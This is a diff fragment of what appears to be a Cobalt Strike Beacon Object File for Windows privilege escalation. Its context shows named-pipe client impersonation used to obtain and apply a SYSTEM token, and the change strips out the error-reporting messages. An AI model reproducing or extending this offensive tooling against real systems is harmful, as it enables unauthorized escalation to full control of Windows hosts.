@@ -97,27 +97,12 @@ void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
 						{
 							/* Impersonate & close handle */
 							BeaconUseToken( Imp ); Api.CloseHandle( Imp );
-						} else
-						{
-							BeaconPrintf( CALLBACK_ERROR, "could not find a system token." );
 						};
-					} else 
-					{
-						BeaconPrintf( CALLBACK_ERROR, "could not impersonate the client." );
 					};
-				} else
-				{
-					BeaconPrintf( CALLBACK_ERROR, "could not establish a connection to the client." );
 				};
 				Api.CloseHandle( Fle );
-			} else
-			{
-				BeaconPrintf( CALLBACK_ERROR, "could not create a client pipe." );
 			};
 			Api.CloseHandle( Nps );
-		} else
-		{
-			BeaconPrintf( CALLBACK_ERROR, "could not create a server pipe." );
 		};
 	};
 	if ( Adv != NULL ) {
